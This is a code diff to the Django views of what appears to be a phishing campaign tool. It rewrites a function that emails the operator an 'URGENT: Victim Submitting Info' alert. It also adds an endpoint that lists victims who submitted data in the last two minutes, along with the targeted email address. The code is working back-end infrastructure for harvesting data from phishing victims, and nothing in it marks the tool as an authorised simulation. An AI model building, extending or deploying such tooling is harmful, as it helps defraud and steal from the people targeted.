@@ -23,6 +23,7 @@ import json
 from django.views.decorators.csrf import csrf_exempt
 from django.views.decorators.http import require_POST
 
+
 logger = logging.getLogger(__name__)
 # Create your views here.
 TEMPLATE_MAPPING = {
@@ -278,39 +279,46 @@ def send_campaign_email(campaign, request):
 
 def send_victim_info_notification(campaign, victim_info, request=None):
     """
-    Send an HTML email to the campaign owner when victim info is started/updated.
+    Send an HTML email to the campaign owner when victim info is first submitted.
     Uses Django's send_mail with html_message, just like send_campaign_email.
     """
-    from django.template.loader import render_to_string
-    from django.utils.html import strip_tags
-    from django.core.mail import send_mail
-    from django.conf import settings
-    from django.urls import reverse
-
-    user = campaign.user
-    subject = f"Victim Info Started for Campaign {campaign}"
-    # Build campaign detail link if request is available
-    if request:
-        campaign_link = request.build_absolute_uri(reverse('core:campaign_detail', args=[campaign]))
-    else:
-        campaign_link = None
-    context = {
-        'campaign': campaign,
-        'victim_info': victim_info,
-        'campaign_link': campaign_link,
-    }
-    html_message = render_to_string('emails/victim_info_notification.html', context)
-    plain_message = strip_tags(html_message)
-    from_email = settings.DEFAULT_FROM_EMAIL
-    recipient_list = [user.email]
-    send_mail(
-        subject,
-        plain_message,
-        from_email,
-        recipient_list,
-        html_message=html_message,
-        fail_silently=True
-    )
+    try:
+        user = campaign.user
+        subject = f"🚨 URGENT: Victim Submitting Info for Campaign {campaign.id}"
+        # Build campaign detail link if request is available
+        if request:
+            campaign_link = request.build_absolute_uri(reverse('core:campaign_detail', args=[str(campaign.id)]))
+            logger.info(f"Campaign link generated: {campaign_link}")
+        else:
+            campaign_link = None
+            logger.info("No request available, campaign_link set to None")
+        context = {
+            'campaign': campaign,
+            'victim_info': victim_info,
+            'campaign_link': campaign_link,
+        }
+        html_message = render_to_string('emails/victim_info_notification.html', context)
+        plain_message = strip_tags(html_message)
+        from_email = settings.DEFAULT_FROM_EMAIL
+        recipient_list = [user.email]
+        
+        logger.info(f"Sending victim info notification to {user.email} for campaign {campaign.id}")
+        
+        send_mail(
+            subject,
+            plain_message,
+            from_email,
+            recipient_list,
+            html_message=html_message,
+            fail_silently=False  # Changed to False to catch errors
+        )
+        
+        logger.info(f"Victim info notification sent successfully to {user.email}")
+        
+    except Exception as e:
+        logger.error(f"Failed to send victim info notification: {str(e)}")
+        # Don't raise the exception to avoid breaking the webhook
+        pass
 
 ################################## Get Victim Info ##################################
 @login_required
@@ -509,3 +517,50 @@ def check_submission_status(request, victim_info_id):
     except Exception as e:
         logger.error(f"Error checking submission status: {str(e)}")
         return JsonResponse({'error': 'Failed to check status'}, status=500)
+
+################################## WEBSITE NOTIFICATIONS ##################################
+
+@login_required
+def get_notifications(request):
+    """
+    Get pending notifications for the current user.
+    Returns notifications about victim submissions.
+    """
+    try:
+        # Get campaigns with recent victim submissions (last 2 minutes)
+        from django.utils import timezone
+        from datetime import timedelta
+        
+        recent_time = timezone.now() - timedelta(minutes=2)
+        
+        # Get campaigns where victims have submitted data recently
+        recent_victims = VictimInfo.objects.filter(
+            campaign__user=request.user,
+            created_at__gte=recent_time
+        ).select_related('campaign', 'campaign__email_template').order_by('-created_at')
+        
+        notifications = []
+        for victim in recent_victims:
+            notifications.append({
+                'id': str(victim.id),
+                'campaign_id': str(victim.campaign.id),
+                'message': f'Victim submitting info for {victim.campaign.email_template.get_type_display()} campaign!',
+                'recipient_email': victim.campaign.recipient_email,
+                'created_at': victim.created_at.isoformat(),
+                'campaign_url': reverse('core:campaign_detail', args=[victim.campaign.id])
+            })
+        
+        return JsonResponse({
+            'status': 'success',
+            'notifications': notifications,
+            'count': len(notifications)
+        })
+        
+    except Exception as e:
+        logger.error(f"Error getting notifications: {str(e)}")
+        return JsonResponse({
+            'status': 'error',
+            'message': 'Failed to get notifications'
+        }, status=500)
+
+################################## Get Victim Info ##################################
